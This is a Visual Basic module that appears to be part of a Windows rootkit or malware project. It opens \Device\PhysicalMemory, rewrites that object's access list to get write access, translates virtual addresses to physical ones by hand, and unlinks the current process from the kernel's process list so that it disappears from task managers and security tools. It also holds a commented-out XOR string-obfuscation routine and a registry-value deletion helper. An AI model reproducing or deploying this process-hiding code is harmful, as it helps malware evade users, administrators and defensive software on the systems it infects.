Attribute VB_Name = "process_mod"
Option Explicit

Public Sub HideCurrentProcess()
    Dim thread As Long, process As Long, fw As Long, bw As Long
    Dim lOffsetFlink As Long, lOffsetBlink As Long, lOffsetPID As Long

    verinfo.dwOSVersionInfoSize = Len(verinfo)
    If (GetVersionEx(verinfo)) <> 0 Then
        If verinfo.dwPlatformId = 2 Then
            If verinfo.dwMajorVersion = 5 Then
                Select Case verinfo.dwMinorVersion
                    Case 0
                        lOffsetFlink = &HA0
                        lOffsetBlink = &HA4
                        lOffsetPID = &H9C
                    Case 1
                        lOffsetFlink = &H88
                        lOffsetBlink = &H8C
                        lOffsetPID = &H84
                End Select
            End If
        End If
    End If

    If OpenPhysicalMemory <> 0 Then
        thread = GetData(&HFFDFF124)
        process = GetData(thread + &H44)
        fw = GetData(process + lOffsetFlink)
        bw = GetData(process + lOffsetBlink)
        SetData fw + 4, bw
        SetData bw, fw
        CloseHandle g_hMPM
    End If
End Sub
Private Sub SetPhyscialMemorySectionCanBeWrited(ByVal hSection As Long)
    Dim pDacl As Long
    Dim pNewDacl As Long
    Dim pSD As Long
    Dim dwRes As Long
    Dim ea As EXPLICIT_ACCESS

    GetSecurityInfo hSection, SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION, 0, 0, pDacl, 0, pSD

    ea.grfAccessPermissions = SECTION_MAP_WRITE
    ea.grfAccessMode = GRANT_ACCESS
    ea.grfInheritance = NO_INHERITANCE
    ea.TRUSTEE.TrusteeForm = TRUSTEE_IS_NAME
    ea.TRUSTEE.TrusteeType = TRUSTEE_IS_USER
    ea.TRUSTEE.ptstrName = "CURRENT_USER" & vbNullChar

    SetEntriesInAcl 1, ea, pDacl, pNewDacl

    SetSecurityInfo hSection, SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION, 0, 0, ByVal pNewDacl, 0

CleanUp:
    LocalFree pSD
    LocalFree pNewDacl
End Sub

Private Function OpenPhysicalMemory() As Long
    Dim Status As Long
    Dim PhysmemString As UNICODE_STRING
    Dim Attributes As OBJECT_ATTRIBUTES

    RtlInitUnicodeString PhysmemString, StrPtr("\Device\PhysicalMemory")
    Attributes.Length = Len(Attributes)
    Attributes.RootDirectory = 0
    Attributes.ObjectName = VarPtr(PhysmemString)
    Attributes.Attributes = 0
    Attributes.SecurityDeor = 0
    Attributes.SecurityQualityOfService = 0

    Status = ZwOpenSection(g_hMPM, SECTION_MAP_READ Or SECTION_MAP_WRITE, Attributes)
    If Status = STATUS_ACCESS_DENIED Then
        Status = ZwOpenSection(g_hMPM, READ_CONTROL Or WRITE_DAC, Attributes)
        SetPhyscialMemorySectionCanBeWrited g_hMPM
        CloseHandle g_hMPM
        Status = ZwOpenSection(g_hMPM, SECTION_MAP_READ Or SECTION_MAP_WRITE, Attributes)
    End If

    Dim lDirectoty As Long
    verinfo.dwOSVersionInfoSize = Len(verinfo)
    If (GetVersionEx(verinfo)) <> 0 Then
        If verinfo.dwPlatformId = 2 Then
            If verinfo.dwMajorVersion = 5 Then
                Select Case verinfo.dwMinorVersion
                    Case 0
                        lDirectoty = &H30000
                    Case 1
                        lDirectoty = &H39000
                End Select
            End If
        End If
    End If

    If Status = 0 Then
        g_pMapPhysicalMemory = MapViewOfFile(g_hMPM, 4, 0, lDirectoty, &H1000)
        If g_pMapPhysicalMemory <> 0 Then OpenPhysicalMemory = g_hMPM
    End If
End Function

Private Function LinearToPhys(BaseAddress As Long, addr As Long) As Long
    Dim VAddr As Long, PGDE As Long, PTE As Long, PAddr As Long
    Dim lTemp As Long

    VAddr = addr
    CopyMemory aByte(0), VAddr, 4
    lTemp = Fix(ByteArrToLong(aByte) / (2 ^ 22))

    PGDE = BaseAddress + lTemp * 4
    CopyMemory PGDE, ByVal PGDE, 4

    If (PGDE And 1) <> 0 Then
        lTemp = PGDE And &H80
        If lTemp <> 0 Then
            PAddr = (PGDE And &HFFC00000) + (VAddr And &H3FFFFF)
        Else
            PGDE = MapViewOfFile(g_hMPM, 4, 0, PGDE And &HFFFFF000, &H1000)
            lTemp = (VAddr And &H3FF000) / (2 ^ 12)
            PTE = PGDE + lTemp * 4
            CopyMemory PTE, ByVal PTE, 4

            If (PTE And 1) <> 0 Then
                PAddr = (PTE And &HFFFFF000) + (VAddr And &HFFF)
                UnmapViewOfFile PGDE
            End If
        End If
    End If

    LinearToPhys = PAddr
End Function

Private Function GetData(addr As Long) As Long
    Dim phys As Long, tmp As Long, ret As Long

    phys = LinearToPhys(g_pMapPhysicalMemory, addr)
    tmp = MapViewOfFile(g_hMPM, 4, 0, phys And &HFFFFF000, &H1000)
    If tmp <> 0 Then
        ret = tmp + ((phys And &HFFF) / (2 ^ 2)) * 4
        CopyMemory ret, ByVal ret, 4

        UnmapViewOfFile tmp
        GetData = ret
    End If
End Function

Private Function SetData(ByVal addr As Long, ByVal data As Long) As Boolean
    Dim phys As Long, tmp As Long, X As Long

    phys = LinearToPhys(g_pMapPhysicalMemory, addr)
    tmp = MapViewOfFile(g_hMPM, SECTION_MAP_WRITE, 0, phys And &HFFFFF000, &H1000)
    If tmp <> 0 Then
        X = tmp + ((phys And &HFFF) / (2 ^ 2)) * 4
        CopyMemory ByVal X, data, 4

        UnmapViewOfFile tmp
        SetData = True
    End If
End Function

Private Function ByteArrToLong(inByte() As Byte) As Double
    Dim i As Integer
    For i = 0 To 3
        ByteArrToLong = ByteArrToLong + inByte(i) * (&H100 ^ i)
    Next i
End Function
'
'Function encdec(inputstrinG As String) As String
'If Len(inputstrinG) = 0 Then Exit Function
'Dim p As String, o As String, k As String, s As String, tempstr As String, i As Integer, g As Integer
'g = 1
'For i = 1 To Len(inputstrinG)
'p = Mid$(inputstrinG, i, 1)
'o = Asc(p)
'k = o Xor g
's = Chr$(k)
'tempstr = tempstr & s
'If g = 255 Then g = 1 Else g = g + 1
'Next i
'encdec = tempstr
'End Function

Public Sub DeleteValue(rClass As T_KeyClasses, Path As String, sKEY As String)
Dim HKey As Long
Dim res As Long
res = RegOpenKeyEx(rClass, Path, 0, KEY_ALL_ACCESS, HKey)
res = RegDeleteValue(HKey, sKEY)
RegCloseKey HKey
End Sub

